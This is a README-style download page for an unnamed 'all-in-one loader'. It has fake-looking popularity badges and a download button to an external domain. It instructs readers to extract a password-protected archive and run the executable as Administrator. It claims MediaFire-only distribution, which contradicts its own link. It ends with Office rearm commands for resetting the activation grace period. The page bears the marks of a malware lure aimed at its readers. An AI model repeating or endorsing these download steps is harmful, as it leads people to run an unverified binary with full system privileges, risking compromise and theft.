<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

### Step 1: Open Command Prompt as Administrator

1. Press **Windows Key**
2. Search **cmd**
3. Right-click **Command Prompt**
4. Click **Run as Administrator**

---

### Step 2: Open Office Installation Folder

1. Open **File Explorer**
2. Navigate to:

```
C:\Program Files\Microsoft Office\Office16
```
### Step 3: Navigate to Office Folder in CMD

In Command Prompt type:

```
cd "C:\Program Files\Microsoft Office\Office16"
```
### Step 4: Check Office License Status

Run the following command:

```
cscript ospp.vbs /dstatus
```
### Step 5: Rearm Office

Run the following command using the copied **SKU ID**:

```
OSPPREARM <SKU_ID>
```

Example:

```
OSPPREARM 6912a74b-a5fb-401a-bfdb-2e3ab46f4b02
```

---

### Step 6: Successful Message

If successful, you will see:

```
Microsoft Office rearm successful.
```
### Notes

* Works for **Office Volume License (KMS Client)** versions.
* Rearm resets the **Office activation grace period**.
* Rearm can only be used a limited number of times.
